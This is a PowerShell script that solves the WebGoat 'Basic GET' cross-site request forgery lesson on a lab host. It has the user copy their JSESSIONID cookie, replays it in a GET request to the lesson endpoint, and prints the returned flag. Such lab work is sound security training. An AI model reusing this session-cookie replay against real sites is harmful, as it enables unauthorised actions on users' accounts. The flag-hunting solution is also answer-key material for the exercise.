# CSRF Basic GET Attack Script

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "WebGoat CSRF - Basic GET Attack" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "This script will help you solve the Basic GET CSRF exercise." -ForegroundColor White
Write-Host ""
Write-Host "First, get your JSESSIONID from the browser:" -ForegroundColor White
Write-Host "1. Open WebGoat and log in" -ForegroundColor Gray
Write-Host "2. Press F12 to open Developer Tools" -ForegroundColor Gray
Write-Host "3. Go to Console tab" -ForegroundColor Gray
Write-Host "4. Type: document.cookie" -ForegroundColor Gray
Write-Host "5. Copy the JSESSIONID value (the hex part after JSESSIONID=)" -ForegroundColor Gray
Write-Host ""

$rawInput = Read-Host "Paste JSESSIONID value here"

# Clean up the input
$sessionId = $rawInput -replace '"', '' -replace "'", '' -replace 'JSESSIONID=', '' -replace 'JSESSIONID:', '' -replace '\s', ''

if ([string]::IsNullOrWhiteSpace($sessionId)) {
    Write-Host "No session ID provided. Exiting." -ForegroundColor Red
    exit 1
}

Write-Host ""
Write-Host "Using session: $sessionId" -ForegroundColor Green
Write-Host ""

# Create web session with cookie
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$cookie = New-Object System.Net.Cookie("JSESSIONID", $sessionId, "/", "192.168.254.112")
$session.Cookies.Add("http://192.168.254.112:8001", $cookie)

# The CSRF target URL
$csrfUrl = "http://192.168.254.112:8001/WebGoat/csrf/basic-get-flag"

Write-Host "=== Triggering CSRF Attack ===" -ForegroundColor Cyan
Write-Host ""
Write-Host "Sending GET request to: $csrfUrl" -ForegroundColor Yellow
Write-Host ""

try {
    # Send the GET request (simulating external site triggering the request)
    $response = Invoke-WebRequest -Uri $csrfUrl -Method Get -WebSession $session
    
    Write-Host "Response Status: $($response.StatusCode)" -ForegroundColor Green
    Write-Host ""
    Write-Host "Response Body:" -ForegroundColor Cyan
    Write-Host $response.Content -ForegroundColor White
    Write-Host ""
    
    # Try to parse as JSON and extract flag
    try {
        $jsonResponse = $response.Content | ConvertFrom-Json
        
        if ($jsonResponse.flag) {
            Write-Host "========================================" -ForegroundColor Green
            Write-Host "FLAG FOUND: $($jsonResponse.flag)" -ForegroundColor Yellow
            Write-Host "========================================" -ForegroundColor Green
            Write-Host ""
            Write-Host "Copy the flag above and paste it in the 'Confirm Flag Value' field in WebGoat!" -ForegroundColor Cyan
        } elseif ($jsonResponse.lessonCompleted -eq $true) {
            Write-Host "Lesson marked as completed!" -ForegroundColor Green
            if ($jsonResponse.feedback) {
                Write-Host "Feedback: $($jsonResponse.feedback)" -ForegroundColor Yellow
            }
        } else {
            Write-Host "Response received but no flag found in JSON." -ForegroundColor Yellow
            Write-Host "Full response:" -ForegroundColor Gray
            Write-Host ($jsonResponse | ConvertTo-Json -Depth 10) -ForegroundColor White
        }
    } catch {
        Write-Host "Response is not JSON or couldn't be parsed." -ForegroundColor Yellow
        Write-Host "Raw response shown above." -ForegroundColor Gray
    }
    
} catch {
    Write-Host "Error occurred:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    Write-Host ""    Write-Host "Troubleshooting:" -ForegroundColor Yellow
    Write-Host "- Make sure WebGoat is running on http://192.168.254.112:8001" -ForegroundColor Gray
    Write-Host "- Verify you're logged in and on the CSRF lesson page" -ForegroundColor Gray
    Write-Host "- Check that the JSESSIONID is correct and current" -ForegroundColor Gray
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Note: For a true CSRF attack demonstration, you should open" -ForegroundColor Yellow
Write-Host "the csrf_basic_get.html file in your browser while logged into WebGoat." -ForegroundColor Yellow
Write-Host "This script simulates the attack using your session cookie." -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Cyan
